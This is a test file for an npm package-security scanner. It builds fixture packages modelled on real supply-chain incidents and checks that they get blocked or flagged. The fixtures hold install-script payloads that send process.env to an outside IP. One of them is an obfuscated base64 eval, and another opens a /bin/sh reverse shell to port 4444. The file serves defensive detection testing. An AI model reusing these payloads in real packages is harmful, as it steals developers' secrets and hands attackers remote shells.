import { afterAll, beforeAll, expect, test } from "bun:test";
import { type FixturePackage, pkgJson } from "../../fixtures/registry/fixtures.ts";
import { type MiniRegistry, startMiniRegistry } from "../../fixtures/registry/server.ts";
import { VerdictCache } from "../../src/cache.ts";
import { checkPackage } from "../../src/engine.ts";

const compromisedPayload =
  "const h=require('https');const e=JSON.stringify(process.env);h.request('http://185.62.190.9/collect',{method:'POST'}).end(e);";

function compromisedFixture(name: string, versions: string[]): FixturePackage {
  return {
    name,
    downloads: 5_000_000,
    latest: versions.at(-1)!,
    versions: Object.fromEntries(
      versions.map((version, index) => [
        version,
        {
          files: [
            pkgJson(name, version, { postinstall: "node ./payload.js" }),
            { path: "payload.js", content: compromisedPayload },
          ],
          scripts: { postinstall: "node ./payload.js" },
          maintainer: { name: "compromised", email: "compromised@example.test" },
          ageHours: 48 - index,
        },
      ]),
    ),
  };
}

const eventStreamFixture: FixturePackage = {
  name: "stream-parser-incident",
  downloads: 8_000_000,
  latest: "3.3.6",
  versions: {
    "3.3.5": {
      files: [
        pkgJson("stream-parser-incident", "3.3.5"),
        { path: "index.js", content: "module.exports={parse(value){return value;}};" },
      ],
      maintainer: { name: "original", email: "original@example.test" },
      ageHours: 9000,
    },
    "3.3.6": {
      files: [
        pkgJson("stream-parser-incident", "3.3.6", { postinstall: "node ./payload.js" }),
        { path: "index.js", content: "module.exports={parse(value){return value;}};" },
        {
          path: "payload.js",
          content: `var _0x1a2b="${"Q".repeat(2100)}";eval(Buffer.from(_0x1a2b,'base64').toString());const h=require('https');h.request('http://185.62.190.9/c').end(JSON.stringify(process.env));`,
        },
      ],
      scripts: { postinstall: "node ./payload.js" },
      maintainer: { name: "new-maintainer", email: "new-maintainer@proton.test" },
      ageHours: 4,
    },
  },
};

const userAgentHijackFixture: FixturePackage = {
  name: "user-agent-parser-incident",
  downloads: 15_000_000,
  latest: "0.6.1",
  versions: {
    "0.6.0": {
      files: [
        pkgJson("user-agent-parser-incident", "0.6.0"),
        { path: "index.js", content: "module.exports={parse(){return {};}};" },
      ],
      maintainer: { name: "original", email: "original@example.test" },
      ageHours: 7000,
    },
    "0.6.1": {
      files: [
        pkgJson("user-agent-parser-incident", "0.6.1", { preinstall: "node ./preinstall.js" }),
        { path: "index.js", content: "module.exports={parse(){return {};}};" },
        {
          path: "preinstall.js",
          content:
            "const net=require('net');const cp=require('child_process');const h=require('https');const s=net.connect(4444,'185.62.190.9');const e=JSON.stringify(process.env);h.request('http://185.62.190.9/env').end(e);cp.spawn('/bin/sh',[],{stdio:[s,s,s]});",
        },
      ],
      scripts: { preinstall: "node ./preinstall.js" },
      maintainer: { name: "hijacker", email: "hijacker@proton.test" },
      ageHours: 2,
    },
  },
};

const provenanceOnlyFixture: FixturePackage = {
  name: "provenance-only-edge",
  downloads: 2_000_000,
  latest: "1.0.1",
  versions: {
    "1.0.0": {
      files: [pkgJson("provenance-only-edge", "1.0.0")],
      maintainer: { name: "steady", email: "steady@example.test" },
      provenance: true,
      ageHours: 9000,
    },
    "1.0.1": {
      files: [pkgJson("provenance-only-edge", "1.0.1")],
      maintainer: { name: "steady", email: "steady@example.test" },
      provenance: false,
      ageHours: 720,
    },
  },
};

const provenancePayloadFixture: FixturePackage = {
  name: "provenance-payload-edge",
  downloads: 2_000_000,
  latest: "1.0.1",
  versions: {
    "1.0.0": {
      files: [pkgJson("provenance-payload-edge", "1.0.0")],
      maintainer: { name: "steady", email: "steady@example.test" },
      provenance: true,
      ageHours: 9000,
    },
    "1.0.1": {
      files: [
        pkgJson("provenance-payload-edge", "1.0.1", { postinstall: "node ./payload.js" }),
        { path: "payload.js", content: compromisedPayload },
      ],
      scripts: { postinstall: "node ./payload.js" },
      maintainer: { name: "steady", email: "steady@example.test" },
      provenance: false,
      ageHours: 720,
    },
  },
};

const riskFixtures: FixturePackage[] = [
  compromisedFixture("chalk", ["5.6.1"]),
  compromisedFixture("debug", ["4.4.2"]),
  compromisedFixture("ansi-styles", ["6.2.2"]),
  compromisedFixture("axios", ["0.30.4", "1.14.1"]),
  compromisedFixture("plain-crypto-js", ["1.0.0", "9.9.9"]),
  eventStreamFixture,
  userAgentHijackFixture,
  provenanceOnlyFixture,
  provenancePayloadFixture,
  {
    name: "l0dash",
    downloads: 5,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [pkgJson("l0dash", "1.0.0")],
        maintainer: { name: "unknown", email: "unknown@example.test" },
        ageHours: 720,
      },
    },
  },
  {
    name: "@rogue/react",
    downloads: 8,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [pkgJson("@rogue/react", "1.0.0")],
        maintainer: { name: "unknown", email: "unknown@example.test" },
        ageHours: 720,
      },
    },
  },
  {
    name: "crystalline-fjord-util",
    downloads: 7,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("crystalline-fjord-util", "1.0.0"),
          { path: "index.js", content: "module.exports=value=>String(value);" },
        ],
        maintainer: { name: "new-author", email: "new-author@example.test" },
        ageHours: 2,
      },
    },
  },
];

const savedEnvironment = {
  registry: process.env.WNPM_REGISTRY,
  downloads: process.env.WNPM_DOWNLOADS,
  key: process.env.OPENAI_API_KEY,
};

let registry: MiniRegistry;

beforeAll(() => {
  registry = startMiniRegistry(0, { only: true, fixtures: riskFixtures });
  process.env.WNPM_REGISTRY = registry.url;
  process.env.WNPM_DOWNLOADS = registry.downloadsUrl;
  delete process.env.OPENAI_API_KEY;
});

afterAll(() => {
  registry.stop();
  if (savedEnvironment.registry === undefined) delete process.env.WNPM_REGISTRY;
  else process.env.WNPM_REGISTRY = savedEnvironment.registry;
  if (savedEnvironment.downloads === undefined) delete process.env.WNPM_DOWNLOADS;
  else process.env.WNPM_DOWNLOADS = savedEnvironment.downloads;
  if (savedEnvironment.key === undefined) delete process.env.OPENAI_API_KEY;
  else process.env.OPENAI_API_KEY = savedEnvironment.key;
});

const cache = () => new VerdictCache(":memory:");

test("every curated real incident entry blocks from the blocklist", async () => {
  const specs = [
    "chalk@5.6.1",
    "debug@4.4.2",
    "ansi-styles@6.2.2",
    "axios@1.14.1",
    "axios@0.30.4",
    "plain-crypto-js@1.0.0",
    "plain-crypto-js@9.9.9",
  ];
  for (const spec of specs) {
    const verdict = await checkPackage(spec, { cache: cache() });
    expect(verdict).toMatchObject({
      verdict: "block",
      source: "blocklist",
      risk_score: 100,
      categories: ["known_malware"],
    });
  }
});

test("event-stream-style maintainer takeover with install-time obfuscated egress blocks", async () => {
  const verdict = await checkPackage("stream-parser-incident@3.3.6", { cache: cache() });
  expect(verdict.verdict).toBe("block");
  expect(verdict.categories).toEqual(
    expect.arrayContaining(["metadata_anomaly", "install_script", "obfuscation", "exfiltration"]),
  );
  expect(verdict.evidence.some((item) => item.detail.includes("all maintainers changed"))).toBe(
    true,
  );
});

test("ua-parser-style environment exfiltration and reverse shell blocks", async () => {
  const verdict = await checkPackage("user-agent-parser-incident@0.6.1", { cache: cache() });
  expect(verdict.verdict).toBe("block");
  expect(verdict.categories).toEqual(expect.arrayContaining(["install_script", "exfiltration"]));
  expect(verdict.evidence.some((item) => item.detail.includes("reverse shell"))).toBe(true);
  expect(verdict.evidence.some((item) => item.detail.includes("environment variables"))).toBe(true);
});

test("curated hallucinated names block before registry resolution", async () => {
  const verdict = await checkPackage("react-hooks-helpers", { cache: cache() });
  expect(verdict).toMatchObject({
    verdict: "block",
    source: "blocklist",
    categories: ["slopsquat"],
  });
});

test("registered homoglyph and scoped impersonation packages block", async () => {
  const homoglyph = await checkPackage("l0dash", { cache: cache() });
  expect(homoglyph.verdict).toBe("block");
  expect(homoglyph.categories).toContain("typosquat");
  expect(homoglyph.evidence.some((item) => item.detail.includes("homoglyph"))).toBe(true);

  const scoped = await checkPackage("@rogue/react", { cache: cache() });
  expect(scoped.verdict).toBe("block");
  expect(scoped.categories).toContain("typosquat");
  expect(scoped.evidence.some((item) => item.detail.includes("scoped name wraps"))).toBe(true);
});

test("provenance downgrade warns alone and blocks with a payload signal", async () => {
  const alone = await checkPackage("provenance-only-edge@1.0.1", { cache: cache() });
  expect(alone.verdict).toBe("warn");
  expect(alone.categories).toContain("provenance_downgrade");

  const combined = await checkPackage("provenance-payload-edge@1.0.1", { cache: cache() });
  expect(combined.verdict).toBe("block");
  expect(combined.categories).toEqual(
    expect.arrayContaining(["provenance_downgrade", "install_script", "exfiltration"]),
  );
});

test("newness and low downloads alone remain allowed", async () => {
  const verdict = await checkPackage("crystalline-fjord-util@1.0.0", { cache: cache() });
  expect(verdict.verdict).toBe("allow");
  expect(verdict.categories).toEqual([]);
});
